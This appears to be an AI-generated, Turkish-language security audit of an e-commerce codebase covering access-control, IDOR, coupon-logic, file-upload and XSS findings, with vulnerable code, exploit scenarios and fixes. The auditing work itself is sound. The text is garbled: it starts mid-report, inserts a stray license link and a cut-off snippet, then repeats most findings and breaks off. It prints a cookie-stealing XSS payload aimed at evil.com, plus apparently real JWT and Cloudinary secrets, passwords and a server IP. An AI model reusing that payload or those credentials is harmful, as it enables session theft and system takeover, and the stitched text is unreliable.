**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key:
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
